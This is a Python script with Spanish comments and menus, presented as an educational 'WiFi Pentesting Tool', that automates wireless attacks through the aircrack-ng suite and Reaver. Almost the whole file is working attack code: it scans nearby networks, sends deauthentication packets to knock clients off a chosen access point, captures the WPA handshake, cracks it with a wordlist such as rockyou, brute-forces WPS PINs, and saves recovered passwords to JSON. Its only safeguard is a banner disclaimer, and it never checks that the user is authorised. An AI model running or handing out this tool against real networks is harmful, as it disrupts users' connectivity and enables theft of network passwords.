import subprocess
import sys
import os
import time
import threading
import argparse
import json
import re
import signal
from datetime import datetime
from pathlib import Path

class Colors:
    """Códigos ANSI para colores en terminal"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class WiFiPentester:
    def __init__(self):
        self.interface = None
        self.monitor_interface = None
        self.target_network = None
        self.target_bssid = None
        self.target_channel = None
        self.wordlist_path = None
        self.output_dir = Path("./wifi_pentest_results")
        self.processes = []
        self.networks = []
        self.clients = []
        
        # Crear directorio de resultados
        self.output_dir.mkdir(exist_ok=True)
        
        # Configurar manejo de señales
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, sig, frame):
        """Manejo de señales para limpieza al salir"""
        print(f"\n{Colors.YELLOW}[!] Recibida señal de interrupción. Limpiando...{Colors.END}")
        self.cleanup()
        sys.exit(0)
    
    def print_banner(self):
        """Imprime el banner de la aplicación"""
        banner = f"""
{Colors.CYAN}
╔══════════════════════════════════════════════════════╗
║                 WiFi Pentesting Tool                 ║
║              Solo uso educativo - Kali Linux         ║
║                                                      ║
║  ADVERTENCIA: Solo para entornos controlados        ║
║  El uso no autorizado es ILEGAL                      ║
╚══════════════════════════════════════════════════════╝
{Colors.END}
"""
        print(banner)
    
    def check_requirements(self):
        """Verifica que las herramientas necesarias estén instaladas"""
        print(f"{Colors.BLUE}[*] Verificando herramientas requeridas...{Colors.END}")
        
        required_tools = [
            'aircrack-ng', 'airodump-ng', 'aireplay-ng', 
            'airmon-ng', 'wash', 'reaver', 'iwconfig', 'macchanger'
        ]
        
        missing_tools = []
        for tool in required_tools:
            if subprocess.call(['which', tool], 
                             stdout=subprocess.DEVNULL, 
                             stderr=subprocess.DEVNULL) != 0:
                missing_tools.append(tool)
        
        if missing_tools:
            print(f"{Colors.RED}[!] Herramientas faltantes: {', '.join(missing_tools)}{Colors.END}")
            print(f"{Colors.YELLOW}[!] Instala con: apt install aircrack-ng reaver{Colors.END}")
            return False
        
        print(f"{Colors.GREEN}[✓] Todas las herramientas están instaladas{Colors.END}")
        return True
    
    def check_root(self):
        """Verifica que el script se ejecute como root"""
        if os.geteuid() != 0:
            print(f"{Colors.RED}[!] Este script requiere privilegios de root{Colors.END}")
            print(f"{Colors.YELLOW}[!] Ejecuta con: sudo python3 {sys.argv[0]}{Colors.END}")
            return False
        return True
    
    def get_interfaces(self):
        """Obtiene las interfaces de red disponibles"""
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            interfaces = []
            
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line:
                    interface = line.split()[0]
                    interfaces.append(interface)
            
            return interfaces
        except Exception as e:
            print(f"{Colors.RED}[!] Error obteniendo interfaces: {e}{Colors.END}")
            return []
    
    def select_interface(self):
        """Permite al usuario seleccionar una interfaz"""
        interfaces = self.get_interfaces()
        
        if not interfaces:
            print(f"{Colors.RED}[!] No se encontraron interfaces WiFi{Colors.END}")
            return False
        
        print(f"\n{Colors.BLUE}[*] Interfaces WiFi disponibles:{Colors.END}")
        for i, interface in enumerate(interfaces, 1):
            print(f"  {i}) {interface}")
        
        try:
            choice = int(input(f"\n{Colors.CYAN}Selecciona una interfaz (1-{len(interfaces)}): {Colors.END}"))
            if 1 <= choice <= len(interfaces):
                self.interface = interfaces[choice - 1]
                print(f"{Colors.GREEN}[✓] Interfaz seleccionada: {self.interface}{Colors.END}")
                return True
            else:
                print(f"{Colors.RED}[!] Selección inválida{Colors.END}")
                return False
        except ValueError:
            print(f"{Colors.RED}[!] Entrada inválida{Colors.END}")
            return False
    
    def enable_monitor_mode(self):
        """Habilita modo monitor en la interfaz"""
        print(f"\n{Colors.BLUE}[*] Habilitando modo monitor en {self.interface}...{Colors.END}")
        
        try:
            # Matar procesos que puedan interferir
            subprocess.run(['airmon-ng', 'check', 'kill'], 
                         capture_output=True, stderr=subprocess.DEVNULL)
            
            # Habilitar modo monitor
            result = subprocess.run(['airmon-ng', 'start', self.interface], 
                                  capture_output=True, text=True)
            
            # Buscar la nueva interfaz en modo monitor
            for line in result.stdout.split('\n'):
                if 'monitor mode enabled' in line.lower():
                    match = re.search(r'on (\w+)', line)
                    if match:
                        self.monitor_interface = match.group(1)
                        break
            
            if not self.monitor_interface:
                # Intentar nombre común
                self.monitor_interface = f"{self.interface}mon"
            
            print(f"{Colors.GREEN}[✓] Modo monitor habilitado: {self.monitor_interface}{Colors.END}")
            return True
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error habilitando modo monitor: {e}{Colors.END}")
            return False
    
    def scan_networks(self, duration=30):
        """Escanea redes WiFi disponibles"""
        print(f"\n{Colors.BLUE}[*] Escaneando redes por {duration} segundos...{Colors.END}")
        print(f"{Colors.YELLOW}[!] Presiona Ctrl+C para detener el escaneo{Colors.END}")
        
        cap_file = self.output_dir / "scan_results"
        
        try:
            # Iniciar airodump-ng
            cmd = ['airodump-ng', '--write', str(cap_file), 
                   '--output-format', 'csv', self.monitor_interface]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE, text=True)
            self.processes.append(process)
            
            # Esperar por la duración especificada o interrupción del usuario
            start_time = time.time()
            while time.time() - start_time < duration:
                if process.poll() is not None:
                    break
                time.sleep(1)
            
            # Terminar proceso
            process.terminate()
            process.wait()
            
            # Leer resultados
            csv_file = f"{cap_file}-01.csv"
            if os.path.exists(csv_file):
                self.parse_scan_results(csv_file)
                return True
            else:
                print(f"{Colors.RED}[!] No se generó archivo de resultados{Colors.END}")
                return False
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Escaneo interrumpido por el usuario{Colors.END}")
            if process:
                process.terminate()
                process.wait()
            return True
        except Exception as e:
            print(f"{Colors.RED}[!] Error durante el escaneo: {e}{Colors.END}")
            return False
    
    def parse_scan_results(self, csv_file):
        """Parsea los resultados del escaneo CSV"""
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            lines = content.split('\n')
            ap_section = True
            
            for line in lines:
                if 'Station MAC' in line:
                    ap_section = False
                    continue
                
                if ap_section and line.strip() and not line.startswith('BSSID'):
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 14:
                        network = {
                            'bssid': parts[0],
                            'first_seen': parts[1],
                            'last_seen': parts[2],
                            'channel': parts[3],
                            'speed': parts[4],
                            'privacy': parts[5],
                            'cipher': parts[6],
                            'auth': parts[7],
                            'power': parts[8],
                            'beacons': parts[9],
                            'iv': parts[10],
                            'lan_ip': parts[11],
                            'id_length': parts[12],
                            'essid': parts[13],
                            'key': parts[14] if len(parts) > 14 else ''
                        }
                        
                        if network['essid'] and network['bssid']:
                            self.networks.append(network)
            
            print(f"{Colors.GREEN}[✓] Se encontraron {len(self.networks)} redes{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error parseando resultados: {e}{Colors.END}")
    
    def display_networks(self):
        """Muestra las redes encontradas"""
        if not self.networks:
            print(f"{Colors.RED}[!] No se encontraron redes{Colors.END}")
            return
        
        print(f"\n{Colors.BOLD}{'#':<3} {'BSSID':<18} {'PWR':<4} {'CH':<3} {'ENC':<8} {'ESSID':<32}{Colors.END}")
        print("-" * 80)
        
        for i, network in enumerate(self.networks, 1):
            essid = network['essid'] if network['essid'] else '<hidden>'
            power = network['power'] if network['power'] != ' -1' else 'N/A'
            
            color = Colors.GREEN if 'WPA' in network['privacy'] else Colors.YELLOW
            
            print(f"{color}{i:<3} {network['bssid']:<18} {power:<4} {network['channel']:<3} "
                  f"{network['privacy']:<8} {essid:<32}{Colors.END}")
    
    def select_target(self):
        """Permite seleccionar una red objetivo"""
        self.display_networks()
        
        try:
            choice = int(input(f"\n{Colors.CYAN}Selecciona una red objetivo (1-{len(self.networks)}): {Colors.END}"))
            if 1 <= choice <= len(self.networks):
                network = self.networks[choice - 1]
                self.target_network = network['essid']
                self.target_bssid = network['bssid']
                self.target_channel = network['channel']
                
                print(f"{Colors.GREEN}[✓] Objetivo seleccionado:{Colors.END}")
                print(f"    ESSID: {self.target_network}")
                print(f"    BSSID: {self.target_bssid}")
                print(f"    Canal: {self.target_channel}")
                print(f"    Encriptación: {network['privacy']}")
                
                return True
            else:
                print(f"{Colors.RED}[!] Selección inválida{Colors.END}")
                return False
        except ValueError:
            print(f"{Colors.RED}[!] Entrada inválida{Colors.END}")
            return False
    
    def capture_handshake(self, timeout=300):
        """Captura handshake WPA/WPA2"""
        print(f"\n{Colors.BLUE}[*] Capturando handshake para {self.target_network}...{Colors.END}")
        
        cap_file = self.output_dir / f"handshake_{self.target_network.replace(' ', '_')}"
        
        try:
            # Iniciar captura específica
            cmd = ['airodump-ng', '--bssid', self.target_bssid, 
                   '--channel', self.target_channel, '--write', str(cap_file),
                   self.monitor_interface]
            
            capture_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                             stderr=subprocess.PIPE)
            self.processes.append(capture_process)
            
            print(f"{Colors.YELLOW}[*] Iniciando deauth attack en 10 segundos...{Colors.END}")
            time.sleep(10)
            
            # Ataque de deautenticación
            deauth_cmd = ['aireplay-ng', '--deauth', '10', '-a', self.target_bssid,
                         self.monitor_interface]
            
            deauth_process = subprocess.Popen(deauth_cmd, stdout=subprocess.PIPE, 
                                            stderr=subprocess.PIPE)
            self.processes.append(deauth_process)
            
            print(f"{Colors.BLUE}[*] Enviando paquetes de deautenticación...{Colors.END}")
            print(f"{Colors.YELLOW}[*] Esperando handshake (timeout: {timeout}s)...{Colors.END}")
            
            # Esperar por el handshake o timeout
            start_time = time.time()
            while time.time() - start_time < timeout:
                # Verificar si hay handshake
                cap_files = list(self.output_dir.glob(f"{cap_file.name}-*.cap"))
                for cap in cap_files:
                    if self.verify_handshake(str(cap)):
                        print(f"{Colors.GREEN}[✓] Handshake capturado: {cap}{Colors.END}")
                        return str(cap)
                
                time.sleep(5)
            
            print(f"{Colors.RED}[!] Timeout - No se capturó handshake{Colors.END}")
            return None
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error capturando handshake: {e}{Colors.END}")
            return None
        finally:
            # Limpiar procesos
            for proc in [capture_process, deauth_process]:
                if proc and proc.poll() is None:
                    proc.terminate()
                    proc.wait()
    
    def verify_handshake(self, cap_file):
        """Verifica si se capturó un handshake válido"""
        try:
            result = subprocess.run(['aircrack-ng', cap_file], 
                                  capture_output=True, text=True)
            
            return 'handshake' in result.stdout.lower()
            
        except Exception:
            return False
    
    def dictionary_attack(self, cap_file, wordlist):
        """Realiza ataque de diccionario contra el handshake"""
        if not wordlist or not os.path.exists(wordlist):
            print(f"{Colors.RED}[!] Wordlist no encontrado: {wordlist}{Colors.END}")
            return None
        
        print(f"\n{Colors.BLUE}[*] Iniciando ataque de diccionario...{Colors.END}")
        print(f"    Archivo: {cap_file}")
        print(f"    Wordlist: {wordlist}")
        print(f"    Objetivo: {self.target_network}")
        
        try:
            cmd = ['aircrack-ng', '-w', wordlist, '-b', self.target_bssid, cap_file]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE, text=True)
            self.processes.append(process)
            
            # Monitorear progreso
            while process.poll() is None:
                time.sleep(1)
            
            stdout, stderr = process.communicate()
            
            # Buscar la clave en la salida
            if 'KEY FOUND!' in stdout:
                lines = stdout.split('\n')
                for line in lines:
                    if 'KEY FOUND!' in line:
                        # Extraer la clave encontrada
                        match = re.search(r'\[ (.+) \]', line)
                        if match:
                            password = match.group(1)
                            print(f"{Colors.GREEN}[✓] ¡CLAVE ENCONTRADA!: {password}{Colors.END}")
                            self.save_result(password)
                            return password
            
            print(f"{Colors.RED}[!] No se encontró la clave con el diccionario proporcionado{Colors.END}")
            return None
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error en ataque de diccionario: {e}{Colors.END}")
            return None
    
    def wps_scan(self):
        """Escanea redes con WPS habilitado"""
        print(f"\n{Colors.BLUE}[*] Escaneando redes con WPS...{Colors.END}")
        
        try:
            cmd = ['wash', '-i', self.monitor_interface, '-C']
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE, text=True)
            
            time.sleep(30)  # Escanear por 30 segundos
            process.terminate()
            stdout, _ = process.communicate()
            
            wps_networks = []
            lines = stdout.split('\n')
            
            for line in lines[2:]:  # Saltar headers
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 6:
                        wps_networks.append({
                            'bssid': parts[0],
                            'channel': parts[1],
                            'rssi': parts[2],
                            'wps_version': parts[3],
                            'wps_locked': parts[4],
                            'essid': ' '.join(parts[5:])
                        })
            
            if wps_networks:
                print(f"{Colors.GREEN}[✓] Se encontraron {len(wps_networks)} redes con WPS{Colors.END}")
                return wps_networks
            else:
                print(f"{Colors.YELLOW}[!] No se encontraron redes con WPS{Colors.END}")
                return []
                
        except Exception as e:
            print(f"{Colors.RED}[!] Error escaneando WPS: {e}{Colors.END}")
            return []
    
    def wps_attack(self, bssid, channel):
        """Realiza ataque WPS con Reaver"""
        print(f"\n{Colors.BLUE}[*] Iniciando ataque WPS contra {bssid}...{Colors.END}")
        print(f"{Colors.YELLOW}[!] Esto puede tomar varias horas...{Colors.END}")
        
        try:
            cmd = ['reaver', '-i', self.monitor_interface, '-b', bssid, 
                   '-c', channel, '-vv']
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                     stderr=subprocess.STDOUT, text=True)
            self.processes.append(process)
            
            # Monitorear salida
            while process.poll() is None:
                line = process.stdout.readline()
                if line:
                    print(line.strip())
                    if 'WPS PIN:' in line or 'WPA PSK:' in line:
                        print(f"{Colors.GREEN}[✓] Ataque WPS exitoso!{Colors.END}")
                        return True
            
            print(f"{Colors.RED}[!] Ataque WPS falló{Colors.END}")
            return False
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error en ataque WPS: {e}{Colors.END}")
            return False
    
    def save_result(self, password):
        """Guarda los resultados del pentesting"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        result_file = self.output_dir / f"result_{timestamp}.json"
        
        result = {
            'timestamp': timestamp,
            'target_network': self.target_network,
            'target_bssid': self.target_bssid,
            'password_found': password,
            'method': 'dictionary_attack'
        }
        
        try:
            with open(result_file, 'w') as f:
                json.dump(result, f, indent=2)
            print(f"{Colors.GREEN}[✓] Resultado guardado: {result_file}{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error guardando resultado: {e}{Colors.END}")
    
    def cleanup(self):
        """Limpia procesos y restaura la interfaz"""
        print(f"{Colors.BLUE}[*] Realizando limpieza...{Colors.END}")
        
        # Terminar procesos activos
        for process in self.processes:
            if process.poll() is None:
                process.terminate()
                process.wait()
        
        # Restaurar interfaz
        if self.monitor_interface:
            try:
                subprocess.run(['airmon-ng', 'stop', self.monitor_interface], 
                             capture_output=True)
                print(f"{Colors.GREEN}[✓] Interfaz restaurada{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}[!] Error restaurando interfaz: {e}{Colors.END}")
    
    def run_interactive_mode(self):
        """Modo interactivo principal"""
        self.print_banner()
        
        if not self.check_root() or not self.check_requirements():
            return
        
        if not self.select_interface():
            return
        
        if not self.enable_monitor_mode():
            return
        
        try:
            while True:
                print(f"\n{Colors.BOLD}=== MENÚ PRINCIPAL ==={Colors.END}")
                print("1. Escanear redes")
                print("2. Seleccionar objetivo")
                print("3. Capturar handshake")
                print("4. Ataque de diccionario")
                print("5. Escanear WPS")
                print("6. Ataque WPS")
                print("7. Salir")
                
                choice = input(f"\n{Colors.CYAN}Selecciona una opción: {Colors.END}")
                
                if choice == '1':
                    duration = int(input("Duración del escaneo (segundos, default 30): ") or 30)
                    self.scan_networks(duration)
                
                elif choice == '2':
                    if self.networks:
                        self.select_target()
                    else:
                        print(f"{Colors.RED}[!] Primero escanea redes{Colors.END}")
                
                elif choice == '3':
                    if self.target_bssid:
                        cap_file = self.capture_handshake()
                        if cap_file:
                            print(f"{Colors.GREEN}[✓] Handshake guardado: {cap_file}{Colors.END}")
                    else:
                        print(f"{Colors.RED}[!] Primero selecciona un objetivo{Colors.END}")
                
                elif choice == '4':
                    wordlist = input("Ruta del diccionario (/usr/share/wordlists/rockyou.txt): ") or "/usr/share/wordlists/rockyou.txt"
                    cap_files = list(self.output_dir.glob("*.cap"))
                    
                    if cap_files:
                        print("Archivos de captura disponibles:")
                        for i, cap in enumerate(cap_files, 1):
                            print(f"  {i}) {cap.name}")
                        
                        try:
                            cap_choice = int(input("Selecciona archivo: ")) - 1
                            if 0 <= cap_choice < len(cap_files):
                                self.dictionary_attack(str(cap_files[cap_choice]), wordlist)
                        except ValueError:
                            print(f"{Colors.RED}[!] Selección inválida{Colors.END}")
                    else:
                        print(f"{Colors.RED}[!] No hay archivos de captura{Colors.END}")
                
                elif choice == '5':
                    wps_networks = self.wps_scan()
                    if wps_networks:
                        print(f"\n{Colors.BOLD}Redes WPS encontradas:{Colors.END}")
                        for net in wps_networks:
                            print(f"  {net['bssid']} - {net['essid']} (Canal: {net['channel']})")
                
                elif choice == '6':
                    bssid = input("BSSID objetivo: ")
                    channel = input("Canal: ")
                    if bssid and channel:
                        self.wps_attack(bssid, channel)
                
                elif choice == '7':
                    break
                
                else:
                    print(f"{Colors.RED}[!] Opción inválida{Colors.END}")
        
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Interrupted by user{Colors.END}")
        finally:
            self.cleanup()

def main():
    parser = argparse.ArgumentParser(description='WiFi Pentesting Tool - Solo uso educativo')
    parser.add_argument('-i', '--interface', help='Interfaz de red a usar')
    parser.add_argument('-t', '--target', help='BSSID objetivo')
    parser.add_argument('-w', '--wordlist', help='Archivo de diccionario')
    parser.add_argument('--scan-time', type=int, default=30, help='Tiempo de escaneo en segundos')
    
    args = parser.parse_args()
    
    pentester = WiFiPentester()
    
    if args.interface:
        pentester.interface = args.interface
    if args.target:
        pentester.target_bssid = args.target
    if args.wordlist:
        pentester.wordlist_path = args.wordlist
    
    # Ejecutar en modo interactivo
    pentester.run_interactive_mode()

if __name__ == "__main__":
    main()
